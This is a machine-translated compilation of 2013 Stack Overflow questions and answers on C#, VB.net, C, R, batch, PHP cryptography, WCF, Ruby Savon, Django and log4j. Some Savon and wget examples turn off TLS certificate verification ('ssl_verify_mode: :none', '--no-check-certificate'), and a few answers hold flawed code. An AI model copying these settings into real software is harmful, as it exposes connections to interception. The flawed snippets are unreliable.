## 回答 #4

> 赞同：1
> 
> 时间：2013-04-12T15:55:26.363

我建议您在编写测试之前确定需要测试的内容。

在上面的代码示例中，正在测试的是调度程序生成了特定的任务序列，即使根据您对调度程序的描述，实际序列是不确定的，因此测试并不能真正提供任何关于代码：有时它会通过，有时它不会，当它通过时，它只是偶然。

另一方面，更有价值的测试可能是在结果中断言任务的存在（或不存在）而不断言它们的位置：“在集合中”与“在数组位置”

# abstract-class - AutoMapper 和基本类型

> ID：15973258
> 
> 赞同：1
> 
> 时间：2013-04-12T13:57:39.600
> 
> 标签：abstract-class, automapper

我有一个 EntityDtos 的集合。

每个 EntityDto 都有一个名为 EntityType 的属性。

这些 EntityTypes 中的每一个都对应一个不同的子类，就像这样

```
abstract class EntityBase { EntityType = EntityType.Base; }
class EntityOne : EntityBase { EntityType = EntityType.One; }
class EntityTwo : EntityBase { EntityType = EntityType.Two; } 
```

我正在尝试映射到 EntityBase 的集合。AutoMapper 失败并出现错误“无法创建抽象类的实例”。我有 Type 枚举，因此知道每个应该映射到什么类型......但实际上，只是希望它们都映射到我的 EntityBase 集合中。

我想不通这个...

我有这个工作，但它非常难看。

```
Mapper.CreateMap<EntityCollectionDto, EntityCollection>().ForMember(
    s => s.Entities, d => d.MapFrom(
        x => new List<EntityBase>(
            from p in x.Entitys
            select p.EntityType == EntityType.One ? Mapper.Map<EntityOne>(p) as EntityBase
                : p.EntityType == EntityType.Two ? Mapper.Map<EntityTwo>(p) as EntityBase
                : Mapper.Map<EntityThree>(p) as EntityBase
            )
        )
    );

 Mapper.CreateMap<EntityDto, EntityOne>();
 Mapper.CreateMap<EntityDto, EntityTwo>(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T23:16:06.550

我不知道你是否会更喜欢这个，但假设实体类如下：

```
public abstract class EntityBase
{
    public EntityType EntityType { get { return EntityType.Base; } }
}
public class EntityOne : EntityBase
{
    public new EntityType EntityType { get { return EntityType.One; } }
}
public class EntityTwo : EntityBase
{
    public new EntityType EntityType { get { return EntityType.Two; } }
}
public class EntityThree : EntityBase
{
    public new EntityType EntityType { get { return EntityType.Three; } }
}
public class EntityCollection
{
    public IList<EntityBase> Entities { get; set; }
}

public class EntityDto
{
    public EntityType EntityType { get; set; }
}
public class EntityCollectionDto
{
    public IList<EntityDto> Entities { get; set; }
} 
```

您可以创建一个`TypeConverter`：

```
public class EntityTypeConverter : AutoMapper.TypeConverter<EntityDto, EntityBase>
{
    protected override EntityBase ConvertCore(EntityDto source)
    {
        switch (source.EntityType)
        {
            case EntityType.One:
                return AutoMapper.Mapper.Map<EntityOne>(source);
            case EntityType.Two:
                return AutoMapper.Mapper.Map<EntityTwo>(source);
            default:
                return AutoMapper.Mapper.Map<EntityThree>(source);
        }
    }
} 
```

然后，这会将您的映射简化为：

```
AutoMapper.Mapper.CreateMap<EntityDto, EntityBase>()
    .ConvertUsing(new EntityTypeConverter());

AutoMapper.Mapper.CreateMap<EntityDto, EntityOne>();
AutoMapper.Mapper.CreateMap<EntityDto, EntityTwo>();
AutoMapper.Mapper.CreateMap<EntityDto, EntityThree>();

AutoMapper.Mapper.CreateMap<EntityCollectionDto, EntityCollection>();

AutoMapper.Mapper.AssertConfigurationIsValid(); 
```

所以你仍然有特定的映射`TypeConverter`（我不确定有没有办法避免这种情况），但我认为最终结果更清晰一些。

# vb.net - 用户关闭后如何在 VB.net 中关闭 PDF 文件？

> ID：15973261
> 
> 赞同：0
> 
> 时间：2013-04-12T13:57:56.473
> 
> 标签：vb.net

我是 VB.net 的新手。我想知道我是否可以在用户关闭 PDF 文件后删除它。在我的 VB.net 应用程序中，如果用户选择 pdf 选项，他们可以打开 pdf 格式的文件。但是我希望在用户关闭 PDF 文件后删除该文件。

我用谷歌搜索并在 c# 中发现了这段代码

```
var pdfProcess = System.Diagnostics.Process.Start(@"c:\test.pdf");
pdfProcess.Exited += new EventHandler(pdfProcess_Exited);
pdfProcess.EnableRaisingEvents = true;

 void pdfProcess_Exited(object sender, EventArgs e)
        {
            System.IO.File.Delete(@"c:\test.pdf);
        } 
```

我想知道这是否可以在 VB.net 中完成

我先创建文件，然后通过 System.Diagnostics.Process.Start("C:\TEMP\myFile.pdf") 打开它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T22:42:15.677

我使用工具箱中的流程对象，因为我发现查看属性更容易。当我的简单代码无法与 .HasExited 一起使用时，我发现它令人困惑，但我发现您必须指示对象等待退出，所以我编写了程序。所以我找到了解决你问题的方法。

```
Process1.Start("Your file path")
Process1.WaitForExit()

If Process1.HasExited Then
System.IO.File.Delete("Your File Path")
End If 
```

# c# - 将带有用于 xml 的 java 命令的批处理转换为 C#

> ID：15973264
> 
> 赞同：1
> 
> 时间：2013-04-12T13:58:01.647
> 
> 标签：c#, java, xml, cmd

我目前有一个包含这一行的批处理文件：

```
"C:\Program Files (x86)\Java\jre7\bin\java" -Xmx1224m -classpath .\xalan.jar 
org.apache.xalan.xslt.Process -IN  FileIn.xml -XSL FileConvert.xslt -OUT FileOut.xml 
```

它需要一个给定的`xml`和一个给定的`xslt`并吐出一个新的，转换的`xml`。批处理运行得很好，但我正在尝试将其翻译成`C#`这样，以便我可以围绕它构建一个应用程序并能够更改一些参数，例如要选择哪些输入文件。

我的代码是这样的，

```
ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", 
        "/k " + "\"C:\\Program Files (x86)\\Java\\jre7\\bin\\java\" -Xmx1224m -classpath .\xalan.jar org.apache.xalan.xslt.Process -IN  In.xml -XSL Convert.xslt -OUT Out.xml");
Process proc = new Process();
proc.StartInfo = procStartInfo;
proc.Start(); 
```

认为它会像一个简单的`CMD`命令一样运行。当我这样做时，我只会收到一条消息，其中包含您可以使用的 Java 命令列表，然后它就退出了。我尝试了一些使用引号的变体，诸如此类`@"C:\...`。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:03:31.153

试试下面的方法，它会帮助你...

```
string commandLine = "-Xmx1224m -classpath .\xalan.jar org.apache.xalan.xslt.Process -IN  In.xml -XSL Convert.xslt -OUT Out.xml";
System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(commandLine);
procStartInfo.WorkingDirectory = @"C:\Program Files (x86)\Java\jre7\bin\java";
procStartInfo.RedirectStandardOutput = true;
procStartInfo.UseShellExecute = false;
procStartInfo.CreateNoWindow = true;
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo = procStartInfo;
proc.Start();
string result = proc.StandardOutput.ReadToEnd();
Console.WriteLine(result); 
```

# c - C、使用 printf 时的奇怪行为

> ID：15973273
> 
> 赞同：2
> 
> 时间：2013-04-12T13:58:21.830
> 
> 标签：c, binary

在这里，我得到了一个以二进制表示形式打印整数的代码

```
#define BUF_SIZE 33
int main() {
    for (int count = 0; count <=25; count++){

        char buffer[BUF_SIZE];
        buffer[BUF_SIZE - 1] = '\0';

        int2bin(count, buffer, BUF_SIZE - 1);
        printf("%d = %s \n",count, buffer);
    }
}

char *int2bin(int a, char *buffer, int buf_size) {
    buffer += (buf_size - 1);

    for (int i = 31; i >= 0; i--) {
        buffer--;
        *buffer = (a & 1) + '0';
        a >>= 1;
    }

    return buffer;
} 
```

它工作得很好，直到我试图挤压一些代码行替换

```
int2bin(count, buffer, BUF_SIZE - 1);
printf("%d = %s \n",count, buffer); 
```

和

```
printf("%d = %s \n",count, int2bin(count, buffer, BUF_SIZE - 1)); 
```

这些日志完全破坏了我的输出：

```
805306368 = 00000000000000000000000000000000
805306369 = 00000000000000000000000000000001
805306370 = 00000000000000000000000000000010
805306371 = 00000000000000000000000000000011
805306372 = 00000000000000000000000000000100
805306373 = 00000000000000000000000000000101 
```

等等...

你能解释一下为什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T14:04:42.920

乍一看，似乎`-1`不需要`int2bin()`第一个（因为循环以一个 -1 开始）

有关解释，请参阅 Scott Mermelstein 的答案

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-12T14:11:55.257

首先，可以肯定的是，问题不在于`printf`. 让我们假设 printf 工作正常。那么结论是你正在向它传递不同的输入。使用它，让我们详细看看你在做什么。

在您的两行示例中，它之所以有效，是因为您传入了缓冲区。可能是在您的单行示例中，您传递的地址不是缓冲区吗？

好吧，在 int2bin 中，您添加`buf_size - 1`，然后通过 32 个（从 31 到 0 包括在内）数字进行运算，因此应该返回`buffer`，对吗？

错误的。

你传入32。然后你`BUF_SIZE - 1`从中`int2bin`减去 1，所以你添加 31 而不是 32，因此，不返回缓冲区。

观察这一点的简单方法：在函数开始时打印缓冲区的地址，在函数结束时打印缓冲区的地址。

简单的修复：

*   您可以将 int2bin 的第一行设置为`buffer += BUF_SIZE - 1`.
*   您可以简单地保存`buffer`s 原始值并将其返回
*   您不能在 for 循环中使用看似任意的硬代码，而是设置`i = buf_size`.

基本上，epatel 的第一眼答案是正确的。我的回答只是提供了更多细节。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-12T14:16:33.370

在**int2bin**中，您用“0”覆盖**缓冲区**之前的字节。编译器在此位置放置了 printf 的参数“ **count** ”。

只需在通话中删除“-1”

```
printf("%d = %s \n",count, int2bin(count, buffer, BUF_SIZE)); 
```

由 805306368 是二进制

00110000 00000000 00000000 00000000

和

00110000 = 48 = '0'

您的代码中还有一个缺陷，循环计数取决于 buf_size！我建议以这种方式重写它。

```
#define BUF_SIZE sizeof(int)
int main() {
  for (int count = 0; count <=25; count++){

    char buffer[BUF_SIZE + 1];
    buffer[BUF_SIZE] = '\0';

    int2bin(count, buffer, BUF_SIZE);
    printf("%d = %s \n",count, buffer);
  }
}

char *int2bin(int a, char *pBuffer, int buf_size) {
   char *buffer = pBuffer + buf_size;

   for (int i = buf_size; i > 0; i--) { // loop count depends on buf_size!!!
     buffer--;
     *buffer = (a & 1) + '0';
     a >>= 1;
   }

   return pBuffer;
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-12T14:12:43.430

您必须将该函数称为

```
int2bin(count, buffer, BUF_SIZE) 
```

否则该函数将从`buffer minus 1byte`（这是一个在内存中放置一些垃圾的下溢）写入位字符到`buffer + 31 bytes`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-12T14:37:49.050

您的代码因向下计数循环和“试图变得聪明”而相当晦涩，例如 fishy `*buffer = (a & 1) + '0';`。位掩码与 ASCII 数字无关，因此不要将它们混合在同一个操作中。尽量让代码简单而不是复杂。这才是你问题的真正根源。

以更易读的方式重写代码，你的错误就会消失。

```
#include <stdio.h>
#include <stdint.h>

void int_to_bin (char bin[32+1], uint32_t val)
{
  for(int i=0; i<32; i++)
  {
    uint32_t mask = 1 << (32 - 1 - i); // -1 to compensate for zero indexing

    if( (val & mask) != 0)
    {
      bin[i] = '1';
    }
    else
    {
      bin[i] = '0';
    }
  }

  bin[32] = '\0';
}

int main()
{
  char buf[32+1]; 

  int_to_bin(buf, 0xAAAA);
  puts(buf);
  int_to_bin(buf, 0xCAFEBABE);
  puts(buf);
  int_to_bin(buf, 0x12345678);
  puts(buf);
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-12T14:18:26.500

除了任何可能有问题的地方`buffer_size`（其他答案已经详细解释了这一点）。最简单的解决方法是添加

```
#include <stdio.h>

char * int2bin(int a, char * buffer, int buf_size); 
```

到代码的顶部。这确实使它编译并为我工作。两者都有

```
int2bin(count, buffer, BUF_SIZE - 1);
printf("%d = %s \n",count, buffer); 
```

和

```
printf("%d = %s \n", count, int2bin(count, buffer, BUF_SIZE)); 
```

# r - 跨选项和组的响应比例

> ID：15973274
> 
> 赞同：0
> 
> 时间：2013-04-12T13:58:27.580
> 
> 标签：r, grouping, aggregation

我对 R 相当熟悉，但已经达到了我的数据需求要求我学习具有多个条件的迭代循环的地步。我已经看到使用各种形式的 *apply() 以及 colSums() 和 rowSums() 用于执行我需要的数据转换类型的示例，但我想提高这些任务的效率，也许嵌套或迭代循环。此外，现有建议没有考虑到忽略/删除“NA”项目导致的数据丢失，我需要能够保留这些信息。

我的一般数据格式如下：

```
group <- c("A", "B", "C", "A", "C" [...])

individual <- c("1", "2", "3", "4", "5" [...])

choice1 <- c("1", "0", "1", "1", "NA")

choice2 <- c("1", "NA", "1", "0", "NA")

[...]

choice10 <- c("1", "0", "1", "1", "NA") 
```

我需要计算三个选项中每一个的计数；1==是；0==否；NA==跨选项和跨组选择退出，然后将这些转换为百分比。我在以前的方法（如 *apply() 或跨行/列求和）中遇到的最大困难是我的“NA”值（选择退出）被忽略，或者阻止我能够充分地跨组获取选择值的百分比. 任何关于如何在循环结构中忽略或保留“退出”/NA 的具体建议或演示将不胜感激。

输出看起来有点像以下：yes.count_bychoice

```
no.count_bychoice

optout.count_bychoice

percentyes_bychoice_bygroup

percentno_bychoice_bygroup

percentout_bychoice_bygroup 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:36:42.820

第一件事。构建一个`data.frame`. 像这样：

```
d <- data.frame(group=group, individual=individual, choice1=choice1 ...) 
```

我将以此为例：

```
d <- data.frame(group=sample(LETTERS[1:4],20,T), individual=1:20,
choice1=sample(c(0,1,NA),20,T), choice2=sample(c(0,1,NA),20,T)) 
```

我明白了

```
> head(d)
  group individual choice1 choice2
1     D          1       1      NA
2     A          2      NA      NA
3     C          3       1       1
4     A          4       1      NA
5     B          5       0      NA
6     B          6       1       1 
```

我们将使用以下函数：

```
f <- function(x) c(yes=sum(x==1,na.rm=TRUE),no=sum(x==0,na.rm=TRUE),optout=sum(is.na(x))) 
```

用于计数和

```
g <- function(x) f(x)/length(x) 
```

百分比。

对于全局计数，您可以使用：

```
counts <- apply(d[,-(1:2)], 2, FUN=f) 
```

结果：

```
> counts
       choice1 choice2
yes         11       8
no           4       2
optout       5      10 
```

更改您获得百分比的功能：

```
> apply(d[,-(1:2)], 2, FUN=g)
       choice1 choice2
yes       0.55     0.4
no        0.20     0.1
optout    0.25     0.5 
```

要获得每个选择的每组计数，您可以使用以下命令：

```
counts_grp <- aggregate(d[,-(1:2)], by=list(group=d$group), FUN=f) 
```

结果：

```
> counts_grp
  group choice1.yes choice1.no choice1.optout choice2.yes choice2.no choice2.optout
1     A           1          0              3           2          0              2
2     B           3          2              0           3          1              1
3     C           4          0              2           3          0              3
4     D           3          2              0           0          1              4 
```

对于百分比，您可以简单地切换功能：

```
> aggregate(d[,-(1:2)], by=list(group=d$group), FUN=g)
  group choice1.yes choice1.no choice1.optout choice2.yes choice2.no choice2.optout
1     A   0.2500000  0.0000000      0.7500000         0.5        0.0            0.5
2     B   0.6000000  0.4000000      0.0000000         0.6        0.2            0.2
3     C   0.6666667  0.0000000      0.3333333         0.5        0.0            0.5
4     D   0.6000000  0.4000000      0.0000000         0.0        0.2            0.8 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:30:44.980

对于快速而肮脏的东西，您可能想尝试查看`aggregate`并`prop.table`像这样：

```
#Some data:
df <- data.frame( group = c("A", "B", "C", "A", "C" ) , 
individual = c("1", "2", "3", "4", "5" ),
choice1 = c("1", "0", "1", "1", "NA"),
choice2 = c("1", "NA", "1", "0", "NA") ,
choice3 = c("1", "NA", "NA", "0", "NA") )

#Convert to ordered factor to keep order of values as 0<1<NA in all cases, no matter the order they appear in a column
df <- as.data.frame( lapply( df , factor , order = TRUE ) )

#Then aggregate by group and choice, and work out proportion of each response
# Order of values is 0, then 1, then NA
# But if there are choices with missing values it won't be very good because it isn't labelled which values are which, but if all choices have at least one value in each category then first value will be proportion of 0, next will be proportion of 1's and finally proportion of NAs
aggregate( cbind( choice1 , choice2 , choice3 ) ~ group  , data = df , prop.table )

#group  choice1              choice2              choice3
#1     A 0.5, 0.5 0.6666667, 0.3333333 0.6666667, 0.3333333
#2     B        1                    1                    1
#3     C 0.4, 0.6             0.4, 0.6             0.5, 0.5 
```

# batch-file - SystemInfo - 通过 CMD 获取计算机系统模型 - 额外空格错误

> ID：15973276
> 
> 赞同：0
> 
> 时间：2013-04-12T13:58:29.987
> 
> 标签：batch-file, space, extra, sysinfo

我正在尝试通过批处理文件获取计算机系统模型类型。为此，我创建了这个脚本：

```
systeminfo | find "System Model" > %temp%\TEMPSYSINFO.txt
for /F "tokens=2 delims=:" %%a in (%temp%\TEMPSYSINFO.txt) do set SYSMODEL=%%a
del %temp%\TEMPSYSINFO.txt
set SYSMODEL=%SYSMODEL:~1%
echo %SYSMODEL% >%temp%\SYSMODEL.txt
del %temp%\SYSMODEL.txt
set "Line1=*** System Model: %SYSMODEL%"
echo %Line1% 
```

但是当我运行它时，我会得到额外的空格：

```
*** System Model:              OptiPlex 9010 
```

知道如何解决吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T14:06:22.227

你正在艰难地做这件事。使用`wmic`. 刮起来要快得多，也不那么复杂。

```
for /f "tokens=2 delims==" %%I in ('wmic computersystem get model /format:list') do set "SYSMODEL=%%I"
set "Line1=*** System Model: %SYSMODEL%"
echo %Line1% 
```

`wmic`让你查询各种整洁的 wmi 垃圾。 `wmic /?`了解更多信息。

（根据模糊按钮答案下的 OP 评论更新）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:21:14.977

你可以使用

```
for /F "tokens=2* delims=: " %%a in (%temp%\TEMPSYSINFO.txt) do set SYSMODEL=%%b 
```

意思是使用分隔符 COLON 或 SPACE，使文本 token3 但与文本一样？包括冒号或空格，表示“标记 2 %%a %%b`*`之后的分隔符之后的行的其余部分” `the first-mentioned token (2) is the one that gets assigned to``, the next highest (*) to`

现在你也可以编码

```
for /F "tokens=2* delims=: " %%a in (
 'systeminfo 2^>nul ^| find "System Model" '
 ) do set SYSMODEL=%%b 
```

这意味着您不需要 TEMPSYSINFO.txt 文件。就 FOR 而言，这将执行单引号命令行 - 特殊字符`>`并`|`需要插入符号 ( `^`) 来“转义”它们（关闭它们的特殊含义）（它们属于`quoted command`，而不是 FOR。）

2>nul 将抑制 SYSTEMINFO 进度文本。

打破这条线是非常合理的——只需要小心你在哪里做它。使代码更具可读性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:20:00.707

对于它的价值，我尝试了这个，它把所有的双空格都替换为空
，`echo =%SYSMODEL%=`产生:(
`=my sysmodel =`只有一个尾随空格):)

`set SYSMODEL=%SYSMODEL: =%`

**编辑**
因此，使用 Peter 的极好建议将管道命令放入 中`FOR /F`，我之前尝试过，但使用普通`|`而不是`^|`:)

```
for /F "tokens=2 delims=:" %%a in ('systeminfo 2^>nul ^| find "System Model"') do set SYSMODEL=%%a
set SYSMODEL=%SYSMODEL:  =% 
```

**EDIT 2**
rojo 的回答很棒，但它仍然给我留下了尾随空间，所以我最终还是使用了这个`%var: =%`技巧

```
for /f "tokens=2 delims==" %%a in ('wmic computersystem get model /format:list') do set SYSMODEL=%%a
set SYSMODEL=%SYSMODEL:  =%
echo =%SYSMODEL%= 
```

# php - PHP 中的 RFC 2246 PRF 函数

> ID：15973279
> 
> 赞同：2
> 
> 时间：2013-04-12T13:58:32.707
> 
> 标签：php, hash, cryptography, kdf

我一直在寻找 RFC 2246 中 PRF 函数的实现。我找到了三个。一个[在这里](https://stackoverflow.com/questions/13324785/openssl-prf-function)，一个来自 openSSL 库，一个来自 wpa_supplicant。它们都返回不同的结果。所以我的第一个问题是：某处是否有样本 PRF 输入和样本 PRF 输出？

该功能是从 PHP 连接到 .NET Web 服务（受 WS-Security 保护）的一部分。

到目前为止我发现的是这个。我的客户首先使用用户名/密码和随机数发送一个令牌请求——这是一个 RST。服务器在其 RSTR 中以另一个 nonce 和一个安全令牌进行响应。我的客户的下一个请求应该带有一个签名，其密钥来自两个随机数和一个“主密钥”。该派生密钥是根据 RFC 2246 计算的。这就是为什么我需要一个可靠的实现。

即使我有一个可靠的实现，在 WS-Security 的上下文中，该函数的参数是什么？PRF 函数应采用三个参数，即：

**秘密，标签，种子。**

我在[这里](http://www.codeproject.com/Articles/16427/Digging-into-SecureConversation-Part-I)读到，微软使用的标签是“WS-SecureConversationWS-SecureConversation”，但那篇文章是在 2006 年写的……现在，秘密是什么？是原密码吗？安全令牌？这些的组合？最后，种子是什么？我有两个随机数——我是连接它们，还是它们，异或？

我被严重卡住了。非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-11T18:40:31.407

我为此奋斗了两天，但最终还是成功了。这是我的 PHP psha1 函数，它基于在[对 "signing SOAP message request via ADFS" 的回复中](http://social.microsoft.com/Forums/en-US/c485d98b-6e0b-49e7-ab34-8ecf8d694d31/signing-soap-message-request-via-adfs?forum=crmdevelopment#6cee9fa8-dc24-4524-a5a2-c3d17e05d50e)找到的 C# 方法。将您的 RST 和 RSTR、base64_decode 分别作为 $clientSecret 和 $serverSecret 传递给此函数。令牌响应应该带有一个 KeySize 元素，如果它不等于 256，您可以将其作为 $sizeBits 传递。

```
function psha1($clientSecret, $serverSecret, $sizeBits = 256)
{
    $sizeBytes = $sizeBits / 8;

    $hmacKey = $clientSecret;
    $hashSize = 160; // HMAC_SHA1 length is always 160
    $bufferSize = $hashSize / 8 + strlen($serverSecret);
    $i = 0;

    $b1 = $serverSecret;
    $b2 = "";
    $temp = null;
    $psha = array();

    while ($i < $sizeBytes) {
        $b1 = hash_hmac('SHA1', $b1, $hmacKey, true);
        $b2 = $b1 . $serverSecret;
        $temp = hash_hmac('SHA1', $b2, $hmacKey, true);

        for ($j = 0; $j < strlen($temp); $j++) {
            if ($i < $sizeBytes) {
                $psha[$i] = $temp[$j];
                $i++;
            } else {
                break;
            }
        }
    }

    return implode("", $psha);
} 
```

# wcf - 我可以通过 MEX 为 WsFederationHttpBinding 端点自动生成 STS 绑定吗

> ID：15973284
> 
> 赞同：1
> 
> 时间：2013-04-12T13:58:37.160
> 
> 标签：wcf, wsdl, ws-trust, wsfederationhttpbinding

我有一个 WCF 服务，它以编程方式公开 WsFederationHttpBinding 端点。然后，我想使用 Visual Studio 使用服务引用对话框创建客户端端点。客户端生成正确的端点和绑定，但我必须在客户端配置中为 STS 手动创建绑定，并将其连接到联合服务绑定的发布者元素。有没有办法创建服务器端绑定，以便在客户端自动生成 STS 绑定？

这基本上是我在代码中生成绑定的方式：

```
public class MyServiceHost : ServiceHostFactory
{
    protected override void AddServiceEndpoint(ServiceHost host, Type contract, Uri address)
    {
        var binding = new WSFederationHttpBinding();
        // set up some binding properties here
        binding.Security = new WSFederationHttpSecurity
        {
            Mode = WSFederationHttpSecurityMode.Message,
            Message = new FederatedMessageSecurityOverHttp
            {
                AlgorithmSuite = SecurityAlgorithmSuite.Default,
                EstablishSecurityContext = true,
                IssuedTokenType = "http://docs.oasis-open.org/wss/oasis-wss-saml-token-profile-1.1#SAMLV1.1",
                NegotiateServiceCredential = false,
                IssuerAddress = new EndpointAddress(
                    new Uri("http://mydomain/STSService.svc"), 
                    EndpointIdentity.CreateSpnIdentity("http/IDENTITYMASKED")),
                IssuerBinding = new WSHttpBinding
                {
                    Name = "stsBinding",
                    Security = new WSHttpSecurity
                    {
                        Mode = SecurityMode.Message,
                        Message = new NonDualMessageSecurityOverHttp
                        {
                            ClientCredentialType = MessageCredentialType.Windows,
                            NegotiateServiceCredential = true,
                            AlgorithmSuite = SecurityAlgorithmSuite.Default,
                            EstablishSecurityContext = false
                        }
                    }
                }
            }
        };
        host.AddServiceEndpoint(contract, binding, address);
    }
} 
```

当我在 Visual Studio 中为此生成代理时，stsBinding 不在配置中或已连接，有没有办法让这种情况发生或 MEX 不允许它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:33:06.130

不确定它是否会有所帮助，因为我自己的服务尚未运行，但我的（当前未经测试的）代码设置了 FederatedMessageSecurityOverHttp 元素的 IssuerMetadataAddress，这应该也是使客户端向导能够生成该绑定的原因。

# ruby - SAVON 是否支持客户端证书身份验证

> ID：15973285
> 
> 赞同：7
> 
> 时间：2013-04-12T13:58:37.267
> 
> 标签：ruby, ssl-certificate, savon

我正在评估 savon 是否使用 Web 服务……但如果我可以使用 SSL 客户端证书对提供 SOAP Web 服务的服务器进行身份验证，我找不到任何信息。我阅读了文档，但没有找到任何关于它的信息。

有谁知道 SAVON 是否支持客户端证书身份验证？

问候法克

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-06-29T17:00:01.157

Savon 的最新稳定版本（目前为 2.2.0）通过全局选项支持 SSL 客户端证书。请参阅[文档](http://savonrb.com/version2/globals.html)中的 SSL 部分。

下面是一些示例代码，假设 httpclient 与 httpi 一起使用：

```
savonConfig = {
    :namespace => "http://...com",
    :endpoint => 'https://...:557/x/b/c',
    #:wsdl => 'https://...:557/x/b/c?wsdl',
    :log_level => :debug,
    :log => true,
    :ssl_verify_mode => :none,
    :ssl_cert_file => 'publicCert.pem',
    :ssl_cert_key_file => 'privateKey.pem',
    :ssl_cert_key_password => '1234',
    :open_timeout => 600,
    :read_timeout => 600
}

client = Savon.client savonConfig

soapBody = {
...
}

calcResponse = client.call(:charge, :message => soapBody) 
```

如果您有 pfx 证书/密钥文件，则直接使用它可能会遇到问题 - 因此您可能希望将它们拆分为单独的文件 - 请参阅此页面以获取信息：[从 PKCS12 文件中提取公钥/私钥供以后在 SSH 中使用- PK-认证](https://stackoverflow.com/questions/9497719/how-to-extract-a-public-private-key-from-a-pkcs12-file-with-openssl-for-later-us)

希望有帮助！
丹尼尔

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-04-07T21:35:32.910

We are having issues trying to get savon client to work with ssl client auth but at same time bypass host verification....

[https://github.com/savonrb/savon/issues/679](https://github.com/savonrb/savon/issues/679)

```
client = Savon.client(log_level: :debug,
log: true,
ssl_verify_mode: :none,
ssl_cert_file: (Rails.root + 'signed.cer').to_s,
ssl_cert_key_file: ('private.key').to_s,
wsdl: "https://example.com/Service?wsdl",
endpoint: "https://example.com/Service") 
```

fails with Like HTTPI GET request to wir.dhswir.org (net_http) HTTPI::SSLError: SSL_read: ssl handshake failure

no moe info..

We have tried savon 2.2.0, 2.3.0, and 2.11.0\. with slightly varying error messages.

We are using same PEM formatted key and cert to savon and using unix WGET to compare. WGET will fail if we dont pass --no-check-certificate, however if we add that it passes and can do ssl client auth and get access

```
wget 'https://example.com/CDC/VaccinationService?wsdl'  --certificate=example-int-wi-signed.cer --private-key=private.key -O- --no-check-certificate 
```

# django - Django - 对用户上传的表使用 inspectdb

> ID：15973289
> 
> 赞同：0
> 
> 时间：2013-04-12T13:58:48.443
> 
> 标签：django, django-models, django-celery, inspectdb

我的 Web 应用程序允许用户在 Postgres 数据库中加载/创建表。我知道 Django ORM 需要在 models.py 中为数据库中的每个表定义模型才能访问它。

我想知道是否可以在上传（或删除）后从脚本调用 manage.py inspectdb 以自动生成 models.py。

如果我使用带有 django-celery 的队列来确保每个 inspectdb 一次完成一个，这可能是一个可行的解决方案吗？

感谢您的意见和建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-23T18:29:15.020

那么你可以调用命令

```
from django.core import management
management.call_command('inspectdb') 
```

请参阅[此处](https://docs.djangoproject.com/en/dev/ref/django-admin/#running-management-commands-from-your-code)了解更多信息。

但我怀疑它是否可以按照您想要的方式动态创建模型。一方面，大多数 wsgi 服务器需要重新启动才能显示更改。

# java - log4j - 写入/记录到多个日志文件取决于应用程序

> ID：15973292
> 
> 赞同：2
> 
> 时间：2013-04-12T13:58:51.273
> 
> 标签：java, logging, log4j

假设我有一个名为 myApp.jar 的 jar 文件。jar 文件由 4 个应用程序组成。jar 文件中的所有四个应用程序都使用 jar 文件中的相同代码，唯一的区别是数据的提取和转换方式。jar 文件中的包看起来像这样

```
com.myapp
    |-App1Main.java
    |-App2Main.java
    |-App3Main.java
    |-App4Main.java
com.myapp.transform
    |-App1Transform
    |-App2Transform
    |-App3Transform
com.myapp.service
    |-MyAppService.java
com.myapp.model
    |-{ModelClasses}
com.myapp.dao
    |-MyAppDAO 
```

唯一的区别是每个应用程序使用一组不同的算法来转换/转换来自不同来源的数据。一旦数据被转换，服务、dao、模型类都在不同的应用程序之间共享。应用程序使用与此类似的命令运行

```
$JAVA_HOME/java -cp myApp.jar com.myApp.App1Main.java 
```

jar 文件包含所有三个应用程序都使用的 log4j.propeties 文件。

```
log4j.rootLogger=WARN, stdout, myAppLogger
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout.ConversionPattern=%d [%t] %-5p %c - %m%n
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.myAppLogger.File=/myapp/logs/myapp.log
log4j.appender.myAppLogger.layout=org.apache.log4j.PatternLayout
log4j.appender.myAppLogger.DatePattern=.dd-MM-yyyy
log4j.appender.myAppLogger.layout.ConversionPattern=%d [%t] %-5p %c - %m%n
log4j.appender.myAppLogger=org.apache.log4j.DailyRollingFileAppender 
```

目前，上述配置意味着 jar 文件中的 3 个应用程序中的每一个都写入同一个日志文件 - 即 /myapp/logs/myapp.log 我想更改此设置，以便每个应用程序写入自己的日志文件。

我发现的一种解决方案是将日志文件配置更改为：

```
log4j.appender.myAppLogger.File=/myapp/logs/${logfile.name} 
```

然后只需使用不同的日志文件名称作为系统属性调用每个应用程序，如下所示：

```
$JAVA_HOME/java -cp myApp.jar com.myApp.App1Main.java -Dlogfile.name=myApp1Log.log
$JAVA_HOME/java -cp myApp.jar com.myApp.App1Main.java -Dlogfile.name=myApp2Log.log
$JAVA_HOME/java -cp myApp.jar com.myApp.App1Main.java -Dlogfile.name=myApp3Log.log
$JAVA_HOME/java -cp myApp.jar com.myApp.App1Main.java -Dlogfile.name=myApp4Log.log 
```

